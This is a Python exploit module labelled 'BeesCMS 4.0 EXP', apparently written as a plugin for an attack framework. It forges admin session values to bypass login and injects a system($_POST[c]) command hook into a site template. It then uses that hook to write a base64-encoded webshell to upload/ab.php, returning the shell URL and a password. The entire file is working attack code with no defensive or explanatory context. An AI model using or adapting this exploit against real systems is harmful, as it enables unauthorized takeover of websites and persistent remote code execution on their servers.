'''
BeesCMS 4.0 EXP
'''
import sys
import base64
sys.path.append('..')
from models.payload import Payload,PayloadFailException
import requests
from models.horse import Horse
from configuration import configuration as config
from utils import Utils
import re

class P(Payload):
    def attack(self):        
        try:
            # admin
            s = requests.Session()
            url1 = 'http://{0}/mx_form/mx_form.php?id=12'.format(self.host)
            s.post(url1,data={
                '_SESSION[login_in]':1,
                '_SESSION[admin]':1,
                '_SESSION[login_time]':100000000000000000000000000000000000
            })
            # template foot.html
            url2 = 'http://{0}/admin/admin_template.php?action=xg&nav=list_tpl&admin_p_nav=tpl&lang=cn&file=template/default_phone/foot.html'.format(self.host)
            template = '''
<div class="foot">
	<div class="pw">{print webinfo('web_powerby')/}</div>
        {print system($_POST[c])/}
	<div class="lang">
		{loop source=lang()}
		<a href="{print $v['url']/}" {print $v['class']/} {print $v['target']/}>{print $v['lang_name']/}</a>
		{/loop}
	</div>
</div>
</div>
'''
            res = s.post(url2,data={
                'template':template,
                'action':'save_template',
                'file':'template/default_phone/foot.html',
                'submit':'submit'
            })
            shellUrlTmp = 'http://{0}/index.php'.format(self.host)
            horse = Horse(self.host)
            res = s.post(shellUrlTmp,data={
                'c': 'echo {} | base64 -d > {}'.format(Utils.base64(
                horse.default), config.webRoot+'/upload/ab.php')
            })
            shellUrl = 'http://{0}/upload/ab.php'.format(self.host)
            return shellUrl,Utils.getPassword(self.host)
        except:
            raise PayloadFailException
        raise PayloadFailException



